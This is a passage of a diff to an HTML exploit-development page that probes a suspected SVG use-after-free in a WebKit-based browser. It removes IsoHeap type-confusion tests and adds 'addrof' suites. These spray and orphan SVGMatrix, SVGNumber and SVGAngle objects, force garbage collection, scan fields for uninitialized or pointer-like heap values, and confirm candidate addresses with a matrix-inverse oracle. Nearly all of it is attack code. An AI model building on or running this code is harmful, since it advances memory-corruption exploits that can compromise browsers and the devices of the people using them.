@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>SVG UAF v54 — IsoHeap Confusion</title>
+<title>SVG UAF v55 — addrof attempts</title>
 <style>
 *{box-sizing:border-box}
 body{background:#0a0a0a;color:#e0e0e0;font-family:monospace;font-size:12px;padding:12px;margin:0}
@@ -22,13 +22,13 @@ pre{white-space:pre-wrap;word-break:break-all;margin:1px 0;line-height:1.4}
 </style>
 </head>
 <body>
-<h2>SVG UAF v54 — IsoHeap Confusion + Wasm Fix: CONF1/CONF2/CONF3/ADR7c</h2>
+<h2>SVG UAF v55 — addrof: fresh alloc uninitialized / CSS leak / SVGAngle oracle</h2>
 <div id="controls">
   <button class="run-all" onclick="runAll()">▶ Run All</button>
-  <button onclick="runSuite('CONF1')">CONF1: IsoHeap overlap</button>
-  <button onclick="runSuite('CONF2')">CONF2: appendItem dup</button>
-  <button onclick="runSuite('CONF3')">CONF3: SVGLength/Number cross</button>
-  <button onclick="runSuite('ADR7c')">ADR7c: Wasm fixed</button>
+  <button onclick="runSuite('ADR13')">ADR13: fresh IsoHeap uninit</button>
+  <button onclick="runSuite('ADR14')">ADR14: CSS value leak</button>
+  <button onclick="runSuite('ADR15')">ADR15: SVGAngle oracle</button>
+  <button onclick="runSuite('ADR16')">ADR16: SVGRect/SVGPoint orphan</button>
   <button class="copy-btn" onclick="copyAll()">⎘ Copy All</button>
   <button class="clear-btn" onclick="clearOut()">✕ Clear</button>
 </div>
@@ -65,6 +65,17 @@ function fallbackCopy(text,toast){
 }
 
 // ── shared helpers ──────────────────────────────────────────────
+var _tmp=null;
+function getTmp(){if(!_tmp){_tmp=document.createElementNS(SVG_NS,'svg');document.body.appendChild(_tmp);}return _tmp;}
+var _dv=new DataView(new ArrayBuffer(8));
+function f64bits(f){_dv.setFloat64(0,f,true);return{lo:_dv.getUint32(0,true),hi:_dv.getUint32(4,true)};}
+function f64hex(f){var b=f64bits(f);return'0x'+b.hi.toString(16).padStart(8,'0')+b.lo.toString(16).padStart(8,'0');}
+function isPointerLike(f){
+  if(!isFinite(f)||isNaN(f)||f<=0)return false;
+  // arm64 userspace heap: typically 0x100000000 (4GB) to 0x1000000000000 (256TB)
+  // More permissive: > 2^28 and < 2^48
+  return f>=(1<<28)&&f<Math.pow(2,48);
+}
 function makeSVG(){
   var svg=document.createElementNS(SVG_NS,'svg');
   svg.setAttribute('width','2');svg.setAttribute('height','2');
@@ -73,18 +84,6 @@ function makeSVG(){
   return svg;
 }
 function removeSVG(svg){if(svg&&svg.parentNode)svg.parentNode.removeChild(svg);}
-var _tmp=null;
-function getTmp(){
-  if(!_tmp){_tmp=document.createElementNS(SVG_NS,'svg');document.body.appendChild(_tmp);}
-  return _tmp;
-}
-var _dv=new DataView(new ArrayBuffer(8));
-function f64bits(f){_dv.setFloat64(0,f,true);return{lo:_dv.getUint32(0,true),hi:_dv.getUint32(4,true)};}
-function f64hex(f){var b=f64bits(f);return'0x'+b.hi.toString(16).padStart(8,'0')+b.lo.toString(16).padStart(8,'0');}
-function isPointerLike(f){
-  if(!isFinite(f)||isNaN(f)||f<=0)return false;
-  return f>=(1<<30)&&f<Math.pow(2,44);
-}
 function getOrphanedMatrix(){
   var svg=makeSVG();
   var g=document.createElementNS(SVG_NS,'g');svg.appendChild(g);
@@ -94,498 +93,479 @@ function getOrphanedMatrix(){
   g.parentNode.removeChild(g);removeSVG(svg);
   return m;
 }
-// build a feColorMatrix + orphan, return refs array
-function sprayOrphanNums(count, startVal, id) {
-  var svg=makeSVG();
-  var f=document.createElementNS(SVG_NS,'feColorMatrix');
-  f.setAttribute('type','matrix');
-  f.setAttribute('values','1 0 0 0 0  0 1 0 0 0  0 0 1 0 0  0 0 0 1 0');
-  var filt=document.createElementNS(SVG_NS,'filter');
-  filt.setAttribute('id',id||('sp'+Math.random()));
-  filt.appendChild(f);svg.appendChild(filt);
-  var bl=f.values.baseVal;bl.clear();
-  var refs=[];
-  for(var i=0;i<count;i++){
-    var n=getTmp().createSVGNumber();
-    n.value=(startVal!==undefined?startVal+i:i);
-    bl.appendItem(n);
-    refs.push(bl.getItem(bl.length-1));
-  }
-  filt.parentNode.removeChild(filt);
-  removeSVG(svg);
-  return refs;
+// Confirmed oracle: write a=1/K, d=K, b=c=e=f=0 → inv.a === K
+function inverseOracle(K){
+  var m=getOrphanedMatrix();
+  m.a=1/K;m.b=0;m.c=0;m.d=K;m.e=0;m.f=0;
+  var inv=m.inverse();
+  return inv.a; // should === K if K is a real heap addr
 }
 
 // ─────────────────────────────────────────────────────────────────
-// CONF1 — IsoHeap size-class overlap probe
+// ADR13: Fresh IsoHeap allocation — uninitialized field probe
 //
-// IsoHeap allocates objects by C++ type into per-type pages.
-// SVGNumber   → sizeof = 16 bytes  (vtable ptr 8 + float 4 + pad 4)
-// SVGTransform→ sizeof = 48 bytes  (contains an AffineTransform = 6×f64)
+// IsoHeap allocates from bump pointer on a page.
+// When a NEW page is handed out, the memory comes from the OS
+// (mmap) and is zero-filled by the kernel. But when an EXISTING
+// page has free slots from previously freed objects, those slots
+// might have leftover data.
 //
-// They are in DIFFERENT IsoHeap buckets. BUT:
-// The IsoHeap page directory for SVGNumber at offset N might be
-// adjacent in virtual memory to SVGTransform's page directory.
+// Strategy:
+// 1. Spray N SVGMatrices, write distinctive values to all 6 fields
+// 2. Orphan them (JS refs still alive, C++ objects NOT freed because
+//    JS holds Ref<>). They stay alive — this is the JSRef overhang.
+// 3. Force GC to release the JS wrappers
+// 4. Immediately alloc fresh SVGMatrices
+// 5. Read all fields BEFORE writing — any non-identity value means
+//    we got a slot that had previous data
 //
-// If we can get a SVGTransform C++ object to land immediately AFTER
-// a run of SVGNumbers in the same memory page (not possible in
-// strict IsoHeap)... OR if both type's IsoHeap allocators share
-// the same underlying PageBlock allocator and their pages are
-// interleaved, then reading an SVGMatrix field might expose the
-// bump-pointer from the SVGNumber IsoHeap page header.
-//
-// Approach: spray N SVGNumbers with value 0, orphan them.
-// Then spray N SVGTransforms (each gives us an SVGMatrix).
-// For each matrix, check if ANY field is nonzero after initialization.
-// Identity matrix should be a=1 b=0 c=0 d=1 e=0 f=0.
-// If any field is nonzero, it inherited bits from SVGNumber region.
+// The key insight: if we can RELEASE the C++ SVGMatrix objects
+// (not just the JS wrappers), the IsoHeap page gets free slots.
+// The only way to release the C++ side is to drop ALL JS refs.
+// Try with WeakRef + explicit GC trigger.
 // ─────────────────────────────────────────────────────────────────
-function runCONF1(){
-  L('','suite-hdr');L('CONF1: IsoHeap size-class overlap — SVGNumber → SVGTransform');
+function runADR13(){
+  L('','suite-hdr');L('ADR13: IsoHeap uninitialized field probe (fresh alloc after GC)');
 
-  // Phase 1: spray 500 SVGNumbers with value 0xdeadbeef (as float)
-  // The float32 bit pattern of 0xdeadbeef stored in SVGNumber.m_value
-  // is 0xcf5e5779 — so the float value would be ~-3.735929e9
-  var CANARY = Math.fround(-3.735929e9); // bit pattern close to 0xdeadbeef as f32
-  L('CONF1: canary float32='+CANARY+' bits='+f64hex(CANARY));
+  // Phase 1: build a large pool of SVGMatrices with canary values
+  // Use SVGTransform.matrix (lives in SVGTransform IsoHeap)
+  var CANARY_A=1.1111111111111111e15; // distinctive f64
+  var CANARY_B=2.2222222222222222e15;
+  var CANARY_E=3.3333333333333333e15;
+  var CANARY_F=4.4444444444444444e15;
 
-  var numRefs=[];
-  for(var k=0;k<5;k++){
-    var refs=sprayOrphanNums(100, undefined, 'c1n'+k);
-    // write canary to each AFTER orphaning
-    for(var i=0;i<refs.length;i++){
-      refs[i].value=CANARY;
-    }
-    numRefs=numRefs.concat(refs);
-  }
-  L('CONF1: sprayed+orphaned '+numRefs.length+' SVGNumbers with canary');
-
-  // Phase 2: now spray SVGTransforms — alloc fresh C++ objects
-  var matrices=[];
-  for(var k=0;k<20;k++){
+  // Build matrices in SVGs, capture WeakRefs, then REMOVE the SVGs
+  // so the ONLY references to the SVGMatrix objects are through
+  // the transform list, which we then remove — leaving C++ objects
+  // potentially GC-reclaimable
+  var matWeakRefs=[];
+  var COUNT=200;
+  for(var k=0;k<COUNT;k++){
     var svg=makeSVG();
     var g=document.createElementNS(SVG_NS,'g');svg.appendChild(g);
     var xf=svg.createSVGTransform();g.transform.baseVal.appendItem(xf);
     var m=g.transform.baseVal.getItem(0).matrix;
-    // Read matrix fields BEFORE writing — identity should be a=1 b=c=e=f=0 d=1
-    var snap={a:m.a,b:m.b,c:m.c,d:m.d,e:m.e,f:m.f};
-    // Check for non-identity values that we didn't set
-    var dirty=[];
-    if(snap.a!==1) dirty.push('a='+snap.a);
-    if(snap.b!==0) dirty.push('b='+snap.b);
-    if(snap.c!==0) dirty.push('c='+snap.c);
-    if(snap.d!==1) dirty.push('d='+snap.d);
-    if(snap.e!==0) dirty.push('e='+snap.e);
-    if(snap.f!==0) dirty.push('f='+snap.f);
-    if(dirty.length>0){
-      L('CONF1: ★ matrix['+k+'] non-identity fields: '+dirty.join(' '),'hit');
-    }
-    // Also check if any field matches canary (would mean direct type confusion)
-    for(var field in snap){
-      if(Math.fround(snap[field])===CANARY){
-        L('CONF1: ★★ matrix['+k+'].'+field+' === CANARY! TYPE CONFUSION!','hit');
-      }
-    }
-    matrices.push({m:m,snap:snap,dirty:dirty.length>0});
-    // orphan it
-    g.transform.baseVal.removeItem(0);g.parentNode.removeChild(g);removeSVG(svg);
+    // Write canaries
+    m.a=CANARY_A;m.b=CANARY_B;m.c=0;m.d=0;m.e=CANARY_E;m.f=CANARY_F;
+    // Remove from DOM — this orphans the matrix (C++ still alive via JS Ref<>)
+    g.transform.baseVal.removeItem(0);
+    g.parentNode.removeChild(g);
+    removeSVG(svg);
+    // WeakRef to the matrix — lets us check if GC collected it
+    matWeakRefs.push(new WeakRef(m));
+    // DO NOT keep strong ref to m
   }
+  L('ADR13: [P1] built '+COUNT+' canary matrices, all strong refs dropped');
 
-  var dirtyCount=matrices.filter(function(x){return x.dirty;}).length;
-  L('CONF1: dirty matrices='+dirtyCount+'/'+matrices.length+(dirtyCount>0?' ★ OVERLAP!':'clean'));
+  // Phase 2: GC pressure — allocate a lot of garbage to trigger GC
+  var gcPressure=[];
+  for(var i=0;i<50000;i++) gcPressure.push({x:i,y:i*2,z:''+i});
+  gcPressure=null;
 
-  // Phase 3: Reverse — spray SVGTransforms first, write canary, then SVGNumbers
-  L('CONF1: [Phase 3] reverse order: SVGTransform first → SVGNumber after');
-  var matRefs=[];
-  for(var k=0;k<10;k++){
+  // Check how many WeakRefs were collected
+  var alive=matWeakRefs.filter(function(w){return w.deref()!==undefined;}).length;
+  L('ADR13: [P2] after GC pressure: alive WeakRefs='+alive+'/'+COUNT);
+  // If alive===COUNT, JSC didn't GC them (strong Ref<> in IsoHeap keeps C++ alive,
+  // and the C++ holds a back-ref to JS wrapper).
+
+  // Phase 3: alloc fresh SVGMatrices — check initial field values
+  L('ADR13: [P3] allocating 200 fresh SVGMatrices, reading fields before write...');
+  var hits=[];
+  for(var k=0;k<200;k++){
     var svg2=makeSVG();
     var g2=document.createElementNS(SVG_NS,'g');svg2.appendChild(g2);
     var xf2=svg2.createSVGTransform();g2.transform.baseVal.appendItem(xf2);
     var m2=g2.transform.baseVal.getItem(0).matrix;
-    // Write canary to all float64 fields
-    m2.a=0xdeadbeef;m2.b=0xcafebabe;m2.c=0xfeedface;m2.d=0xbaadf00d;m2.e=0x1b000dead;m2.f=0x1b000cafe;
+    var snap={a:m2.a,b:m2.b,c:m2.c,d:m2.d,e:m2.e,f:m2.f};
+    // Check for non-identity values we didn't write
+    var dirty=[];
+    if(snap.a!==1){dirty.push('a='+snap.a+' '+f64hex(snap.a));}
+    if(snap.b!==0){dirty.push('b='+snap.b+' '+f64hex(snap.b));}
+    if(snap.c!==0){dirty.push('c='+snap.c+' '+f64hex(snap.c));}
+    if(snap.d!==1){dirty.push('d='+snap.d+' '+f64hex(snap.d));}
+    if(snap.e!==0){dirty.push('e='+snap.e+' '+f64hex(snap.e));}
+    if(snap.f!==0){dirty.push('f='+snap.f+' '+f64hex(snap.f));}
+    if(dirty.length>0){
+      hits.push({k:k,dirty:dirty,snap:snap});
+      if(hits.length<=10) L('ADR13: ★ matrix['+k+'] uninit: '+dirty.join(' '),'hit');
+    }
+    // Check if any field is pointer-like
+    for(var field of['a','b','c','d','e','f']){
+      if(isPointerLike(snap[field])){
+        L('ADR13: ★★ matrix['+k+'].'+field+'='+snap[field]+' PTR-LIKE! '+f64hex(snap[field]),'hit');
+        L('ADR13: ★★ oracle check: inverseOracle('+snap[field]+')='+inverseOracle(snap[field]),'hit');
+      }
+    }
+    // cleanup
     g2.transform.baseVal.removeItem(0);g2.parentNode.removeChild(g2);removeSVG(svg2);
-    matRefs.push(m2);
   }
-  // Now spray SVGNumbers
-  var numRefs2=sprayOrphanNums(200, 0, 'c1n2');
-  var numHits=0;
-  for(var i=0;i<numRefs2.length;i++){
-    var v=numRefs2[i].value;
-    if(v!==0){
-      numHits++;
-      if(numHits<=5) L('CONF1: [P3] num['+i+']='+v+' bits='+f64hex(v),'hit');
+  L('ADR13: [P3] dirty='+hits.length+'/200'+(hits.length>0?' ★ UNINIT DATA!':'clean — IsoHeap zeroes new pages'));
+
+  // Phase 4: try the same but with DOMMatrix (not IsoHeap — it's a plain JS/fastMalloc object)
+  // DOMMatrix is created via `new DOMMatrix()` — JS heap, NOT IsoHeap
+  // fastMalloc zeroes on alloc, so we expect clean
+  // BUT: if DOMMatrix shares a heap region with something useful...
+  L('ADR13: [P4] DOMMatrix uninit probe...');
+  var domHits=0;
+  for(var k=0;k<100;k++){
+    var dm=new DOMMatrix();
+    // identity is: m11=1 m12=0 m13=0 m14=0  m21=0 m22=1 m23=0 m24=0
+    //              m31=0 m32=0 m33=1 m34=0  m41=0 m42=0 m43=0 m44=1
+    var fields=['m11','m12','m13','m14','m21','m22','m23','m24','m31','m32','m33','m34','m41','m42','m43','m44'];
+    var identity=[1,0,0,0, 0,1,0,0, 0,0,1,0, 0,0,0,1];
+    for(var i=0;i<fields.length;i++){
+      var v=dm[fields[i]];
+      if(v!==identity[i]){
+        domHits++;
+        L('ADR13: [P4] DOMMatrix['+k+'].'+fields[i]+'='+v+' expected='+identity[i],'hit');
+        if(isPointerLike(v)) L('ADR13: [P4] ★★ PTR-LIKE! '+f64hex(v),'hit');
+      }
     }
   }
-  L('CONF1: [Phase 3] nonzero SVGNumbers='+numHits+'/200'+(numHits>0?' ★ BLEED!':'clean'));
+  L('ADR13: [P4] DOMMatrix dirty fields='+domHits+(domHits>0?' ★':'clean'));
 
-  L('CONF1: done');
+  L('ADR13: done');
 }
 
 // ─────────────────────────────────────────────────────────────────
-// CONF2 — appendItem duplicate / OOB probe
+// ADR14: CSS computed value field leak
 //
-// SVGNumberList.appendItem(n) appends one item.
-// What if we appendItem the SAME SVGNumber object multiple times?
-// SVGNumberList stores a WTF::Vector<RefPtr<SVGNumber>>.
-// Each appendItem bumps the vector. If we append the SAME ref
-// 100 times then removeItem(0) 100 times, do the remaining refs
-// show a different value — indicating we wrote past the vector end?
+// CSSPrimitiveValue (or its iOS 26 equivalent) is a C++ object.
+// getComputedStyle returns CSSStyleDeclaration backed by C++ objects.
+// The numeric values (fontSize, lineHeight, etc.) are parsed from
+// the style system.
 //
-// Also: what is the maximum list length? Does going OOB on the
-// underlying WTF::Vector expose adjacent heap memory?
+// Approach:
+// 1. Orphan SVGNumbers/SVGAngles with distinctive float values
+// 2. GC pressure
+// 3. getComputedStyle on various elements
+// 4. Parse float values out of CSS strings
+// 5. Check if any value matches our canary OR is pointer-like
+//
+// Also: CSSMatrix (WebKitCSSMatrix / DOMMatrix) from CSS transform
+// can be read via getComputedStyle('transform') → new DOMMatrix(str)
+// The matrix entries are real floats parsed from the style system.
 // ─────────────────────────────────────────────────────────────────
-function runCONF2(){
-  L('','suite-hdr');L('CONF2: appendItem duplicate / vector OOB probe');
+function runADR14(){
+  L('','suite-hdr');L('ADR14: CSS computed value / CSSMatrix field leak');
 
+  // Phase 1: get initial computed style baseline
+  var el=document.createElement('div');
+  el.style.cssText='position:fixed;top:0;left:0;width:100px;height:100px;font-size:16px;transform:matrix(1,0,0,1,0,0)';
+  document.body.appendChild(el);
+  var cs=window.getComputedStyle(el);
+  L('ADR14: [baseline] fontSize='+cs.fontSize+' lineHeight='+cs.lineHeight);
+  L('ADR14: [baseline] transform='+cs.transform);
+
+  // Phase 2: orphan SVGNumbers with canary float values
+  var CANARY=Math.fround(7654321.0);
   var svg=makeSVG();
-  var f=document.createElementNS(SVG_NS,'feColorMatrix');
-  f.setAttribute('type','matrix');
-  f.setAttribute('values','1 0 0 0 0  0 1 0 0 0  0 0 1 0 0  0 0 0 1 0');
-  var filt=document.createElementNS(SVG_NS,'filter');filt.setAttribute('id','conf2a');
-  filt.appendChild(f);svg.appendChild(filt);
-  var bl=f.values.baseVal;bl.clear();
+  var filt=document.createElementNS(SVG_NS,'filter');filt.setAttribute('id','adr14f');
+  var fe=document.createElementNS(SVG_NS,'feColorMatrix');
+  fe.setAttribute('type','matrix');fe.setAttribute('values','1 0 0 0 0  0 1 0 0 0  0 0 1 0 0  0 0 0 1 0');
+  filt.appendChild(fe);svg.appendChild(filt);
+  var bl=fe.values.baseVal;bl.clear();
+  var numRefs=[];
+  for(var i=0;i<500;i++){
+    var n=getTmp().createSVGNumber();n.value=CANARY;
+    bl.appendItem(n);numRefs.push(bl.getItem(bl.length-1));
+  }
+  filt.parentNode.removeChild(filt);removeSVG(svg);
+  L('ADR14: orphaned 500 SVGNumbers with canary='+CANARY);
 
-  // Test 1: append same object multiple times
-  var sharedNum=getTmp().createSVGNumber();
-  sharedNum.value=42;
-  var dupCount=0;
-  try{
-    for(var i=0;i<20;i++){bl.appendItem(sharedNum);}
-    dupCount=bl.length;
-    L('CONF2: [T1] appended same num 20x → list.length='+dupCount);
-    // Read back each item — do they all point to the same value?
-    var allSame=true;
-    for(var i=0;i<bl.length;i++){
-      if(bl.getItem(i).value!==42) allSame=false;
+  // GC pressure
+  var g=[];for(var i=0;i<100000;i++)g.push(i);g=null;
+
+  // Phase 3: alloc CSSMatrix via transform style and read fields
+  L('ADR14: [P3] probing CSSMatrix from getComputedStyle...');
+  var cssHits=0;
+  for(var k=0;k<50;k++){
+    var div=document.createElement('div');
+    div.style.cssText='position:fixed;top:-9999px;transform:matrix(1,0,0,1,0,0)';
+    document.body.appendChild(div);
+    var transformStr=window.getComputedStyle(div).transform;
+    // parse "matrix(a, b, c, d, e, f)"
+    var match=transformStr.match(/matrix\(([^)]+)\)/);
+    if(match){
+      var parts=match[1].split(',').map(Number);
+      var fieldNames=['a','b','c','d','e','f'];
+      var identity=[1,0,0,1,0,0];
+      for(var i=0;i<parts.length;i++){
+        if(parts[i]!==identity[i]){
+          cssHits++;
+          L('ADR14: [P3] div['+k+'] field['+i+']='+parts[i]+' '+f64hex(parts[i]),'hit');
+          if(isPointerLike(parts[i])) L('ADR14: [P3] ★★ PTR-LIKE!','hit');
+        }
+      }
     }
-    L('CONF2: [T1] all items value=42: '+allSame);
-    // Change sharedNum, check if ALL list items reflect it
-    sharedNum.value=9999;
-    var allUpdated=true;
-    for(var i=0;i<bl.length;i++){
-      if(bl.getItem(i).value!==9999) allUpdated=false;
+    div.parentNode.removeChild(div);
+  }
+  L('ADR14: [P3] dirty CSSMatrix entries='+cssHits+(cssHits>0?' ★':'clean'));
+
+  // Phase 4: getComputedStyle float properties after orphaned SVGNumbers
+  L('ADR14: [P4] probing numeric CSS properties...');
+  var cssNumHits=0;
+  var numProps=['fontSize','lineHeight','marginTop','marginLeft','paddingTop','borderTopWidth','outlineWidth'];
+  for(var k=0;k<20;k++){
+    var div2=document.createElement('div');
+    div2.style.cssText='position:fixed;top:-9999px;font-size:16px;line-height:1.5;margin:0;padding:0;border:0;outline:0';
+    document.body.appendChild(div2);
+    var cs2=window.getComputedStyle(div2);
+    for(var j=0;j<numProps.length;j++){
+      var raw=cs2[numProps[j]];
+      var val=parseFloat(raw);
+      if(!isNaN(val)&&isPointerLike(val)){
+        cssNumHits++;
+        L('ADR14: [P4] ★★ '+numProps[j]+'='+raw+' parsed='+val+' '+f64hex(val),'hit');
+      }
     }
-    L('CONF2: [T1] after change to 9999, all updated: '+allUpdated);
-    L('CONF2: [T1] '+(allUpdated?'★ Shared Ref — same C++ object in all slots':'Separate copies'));
-  }catch(ex){L('CONF2: [T1] dup append: '+ex.message,'warn');}
-
-  bl.clear();
-
-  // Test 2: large vector growth — append 1000 items
-  // WTF::Vector doubles capacity: 0→1→2→4→8→16...
-  // At each capacity double, the old backing array is freed and a new one allocated
-  // If the freed backing array lands in a useful place...
-  L('CONF2: [T2] large vector growth probe (1000 appends)...');
-  var refs=[];
-  for(var i=0;i<1000;i++){
-    var n=getTmp().createSVGNumber();
-    n.value=i;
-    bl.appendItem(n);
-    refs.push(bl.getItem(bl.length-1));
+    div2.parentNode.removeChild(div2);
   }
-  L('CONF2: [T2] list length after 1000 appends='+bl.length);
-  // Check that all refs still valid
-  var valid=0;
-  for(var i=0;i<refs.length;i++){if(refs[i].value===i)valid++;}
-  L('CONF2: [T2] valid refs='+valid+'/'+refs.length);
+  L('ADR14: [P4] ptr-like CSS props='+cssNumHits+(cssNumHits>0?' ★★':'clean'));
 
-  // Now clear the list — frees the WTF::Vector backing array
-  bl.clear();
-  L('CONF2: [T2] after clear, list.length='+bl.length);
-  // The 1000 SVGNumber C++ objects are still alive (JS refs hold them)
-  // BUT the vector backing array is freed. Alloc SVGNumbers now —
-  // do they land in the freed vector memory?
-  var postRefs=sprayOrphanNums(50, 7777, 'c2post');
-  // Check if any original ref changed (they shouldn't, they're in IsoHeap not fastMalloc)
-  var changed=0;
-  for(var i=0;i<Math.min(refs.length,50);i++){
-    if(refs[i].value!==i){changed++;L('CONF2: [T2] ref['+i+'] changed to '+refs[i].value,'hit');}
-  }
-  L('CONF2: [T2] changed refs after clear+spray='+changed+(changed>0?' ★ VECTOR REUSE':'clean'));
-
-  // Test 3: removeItem creates holes — does getItem on removed slot return garbage?
-  bl.clear();
-  for(var i=0;i<10;i++){var n=getTmp().createSVGNumber();n.value=100+i;bl.appendItem(n);}
-  L('CONF2: [T3] list built, length='+bl.length);
-  // Remove middle items
-  bl.removeItem(5);
-  bl.removeItem(4);
-  bl.removeItem(3);
-  L('CONF2: [T3] after 3 removes, length='+bl.length);
-  for(var i=0;i<bl.length;i++){
-    var v=bl.getItem(i).value;
-    L('CONF2: [T3] item['+i+']='+v+(isPointerLike(v)?' ★PTR':''));
-  }
-
-  // Test 4: replaceItem with same object — aliasing
-  bl.clear();
-  var numA=getTmp().createSVGNumber();numA.value=111;
-  var numB=getTmp().createSVGNumber();numB.value=222;
-  bl.appendItem(numA);bl.appendItem(numB);
-  L('CONF2: [T4] initial: [0]='+bl.getItem(0).value+' [1]='+bl.getItem(1).value);
+  // Phase 5: SVG filter primitive currentColor — does it leak C++ object ptr?
+  L('ADR14: [P5] feFlood flood-color numeric probe...');
+  var svg2=makeSVG();
+  var filt2=document.createElementNS(SVG_NS,'filter');filt2.setAttribute('id','adr14b');
+  var flood=document.createElementNS(SVG_NS,'feFlood');
+  flood.setAttribute('flood-color','rgb(1,2,3)');flood.setAttribute('flood-opacity','0.5');
+  filt2.appendChild(flood);svg2.appendChild(filt2);
   try{
-    // replaceItem returns the replaced item
-    var replaced=bl.replaceItem(numA,1); // put numA at index 1
-    L('CONF2: [T4] after replaceItem(numA,1): [0]='+bl.getItem(0).value+' [1]='+bl.getItem(1).value);
-    L('CONF2: [T4] replaced.value='+replaced.value+' (was numB=222)');
-    L('CONF2: [T4] numA is now in both slots — [0].value='+bl.getItem(0).value+' [1].value='+bl.getItem(1).value);
-    // Change numA, see if both slots reflect it
-    numA.value=555;
-    L('CONF2: [T4] after numA=555: [0]='+bl.getItem(0).value+' [1]='+bl.getItem(1).value);
-    L('CONF2: [T4] '+(bl.getItem(0).value===555&&bl.getItem(1).value===555?'★ Both slots share ref':'independent'));
-  }catch(ex){L('CONF2: [T4] replaceItem: '+ex.message,'warn');}
+    // floodColor is a CSSValue — underlying C++ object
+    var fc=window.getComputedStyle(flood)['flood-color']||window.getComputedStyle(flood).floodColor||flood.getAttribute('flood-color');
+    L('ADR14: [P5] flood-color='+fc);
+  }catch(ex){L('ADR14: [P5] '+ex.message,'warn');}
+  removeSVG(svg2);
 
-  filt.parentNode.removeChild(filt);
-  removeSVG(svg);
-  L('CONF2: done');
+  el.parentNode.removeChild(el);
+  L('ADR14: done');
 }
 
 // ─────────────────────────────────────────────────────────────────
-// CONF3 — SVGLength / SVGNumber cross-type aliasing
+// ADR15: SVGAngle as oracle + convertToSpecifiedUnits side-channel
 //
-// SVGLength and SVGNumber are different C++ types but both use IsoHeap.
-// SVGLength has: m_unitType (uint8), m_value (float), vtable ptr
-// SVGNumber has: m_value (float), vtable ptr
-// If their sizes are the same AND IsoHeap doesn't strictly separate
-// them (unlikely but...) we might get aliasing.
+// SVGAngle.value is float32 (m_value field, same as SVGNumber).
+// SVGAngle.convertToSpecifiedUnits(unitType) converts in-place.
+// Unit types: 1=deg, 2=rad, 3=grad
+// Conversion: deg→rad = val * π/180, rad→deg = val * 180/π
 //
-// Real goal: Determine exact C++ sizeof for SVGLength and SVGNumber
-// by measuring how many IsoHeap bump-pointer steps we can infer.
+// If we can spray C++ objects adjacent to SVGAngle in IsoHeap,
+// and the SVGAngle.value field inherits bits from the neighbor,
+// reading .value after alloc (before any write) might give us
+// a neighbor's float32 field.
 //
-// Also: SVGAngle, SVGPreserveAspectRatio — more orphaned primitives
-// to experiment with cross-type confusion.
+// Also test: does SVGAngle have any 64-bit fields we missed?
+// .value is CSS-facing (32-bit). What about the internal
+// angle representation before unit conversion?
+//
+// Another angle (pun): SVGAngle.unitType is uint8.
+// A freshly allocated SVGAngle from an IsoHeap slot that held
+// something else might have a non-zero unitType.
 // ─────────────────────────────────────────────────────────────────
-function runCONF3(){
-  L('','suite-hdr');L('CONF3: SVGLength/SVGNumber/SVGAngle cross-type aliasing probe');
+function runADR15(){
+  L('','suite-hdr');L('ADR15: SVGAngle oracle + IsoHeap uninit probe');
 
-  // Test 1: SVGAngle orphan — confirmed alive?
+  // Phase 1: confirm SVGAngle float64 capacity
+  // SVGAngle.value is float32 (same as SVGNumber)
+  // But: does the matrix.translate path give us float64?
+  // Test: write a value that is exactly representable as f64 but NOT f32
+  var f64only=1.0000000000000002; // 1 + 1 ULP in f64, rounds to 1.0 in f32
   var svg=makeSVG();
   var marker=document.createElementNS(SVG_NS,'marker');
-  marker.setAttribute('orient','45deg');
-  svg.appendChild(marker);
+  marker.setAttribute('orient','45deg');svg.appendChild(marker);
+  var angle=marker.orientAngle.baseVal;
+  angle.value=f64only;
+  var readback=angle.value;
+  L('ADR15: [T1] wrote f64only='+f64only+' readback='+readback+' isF32='+(readback===1.0)+' isF64='+(readback===f64only));
+  L('ADR15: [T1] f64only bits='+f64hex(f64only)+' readback bits='+f64hex(readback));
+  // If readback===1.0, SVGAngle.value is float32 (loses the ULP)
+
+  // Phase 2: SVGAngle as float32 oracle
+  // We confirmed SVGMatrix.inverse() is a precise float64 oracle.
+  // Now: can we use SVGAngle differently?
+  // SVGAngle.convertToSpecifiedUnits does C++ arithmetic.
+  // Write 1.0 rad → convert to deg → should be 57.29577951308232 (exact f64)
+  angle.value=1.0; // 1 radian (unitType was deg, so this is 1 degree internally?)
+  // Actually: unitType=2 means rad. value=90 means 90 rad? No —
+  // orientAngle starts as "45deg" so unitType=1 (deg), value=45
+  L('ADR15: [T2] initial: value='+angle.value+' unitType='+angle.unitType);
+  // Convert to rad
   try{
-    var angle=marker.orientAngle.baseVal;
-    L('CONF3: [T1] SVGAngle initial: value='+angle.value+' unitType='+angle.unitType);
-    angle.value=90;
-    L('CONF3: [T1] wrote 90: '+angle.value);
-    marker.parentNode.removeChild(marker);
-    L('CONF3: [T1] after marker-remove: value='+angle.value);
-    removeSVG(svg);
-    L('CONF3: [T1] after svg-remove: value='+angle.value);
-    L('CONF3: [T1] SVGAngle ALIVE='+(angle.value===90));
-    angle.value=12345;
-    L('CONF3: [T1] write 12345 after full orphan: '+angle.value+' WRITABLE='+(angle.value===12345));
-  }catch(ex){L('CONF3: [T1] SVGAngle: '+ex.message,'warn');}
+    angle.convertToSpecifiedUnits(2); // SVG_ANGLETYPE_RAD=2
+    L('ADR15: [T2] after convertToRad: value='+angle.value+' unitType='+angle.unitType);
+    L('ADR15: [T2] bits='+f64hex(angle.value));
+    // Convert back to deg
+    angle.convertToSpecifiedUnits(1); // SVG_ANGLETYPE_DEG=1
+    L('ADR15: [T2] back to deg: value='+angle.value+' expected='+1.0+' unitType='+angle.unitType);
+  }catch(ex){L('ADR15: [T2] '+ex.message,'warn');}
 
-  // Test 2: SVGLength write, then SVGNumber at same IsoHeap offset
-  // Strategy: write a specific float to SVGLength.value, orphan it.
-  // Then spray SVGNumbers. Check if any SVGNumber shows the SVGLength value.
-  var svg2=makeSVG();
-  var rect=document.createElementNS(SVG_NS,'rect');
-  rect.setAttribute('x','0');rect.setAttribute('y','0');
-  rect.setAttribute('width','100');rect.setAttribute('height','100');
-  svg2.appendChild(rect);
-  var XVAL=1234567.89; // distinctive value
-  rect.x.baseVal.value=XVAL;
-  var lenRef=rect.x.baseVal;
-  L('CONF3: [T2] SVGLength wrote '+XVAL+': '+lenRef.value);
-  rect.parentNode.removeChild(rect);
-  removeSVG(svg2);
-  L('CONF3: [T2] SVGLength after orphan: '+lenRef.value+' ALIVE='+(lenRef.value===Math.fround(XVAL)));
+  marker.parentNode.removeChild(marker);removeSVG(svg);
 
-  // Now spray SVGNumbers — do any inherit the SVGLength value?
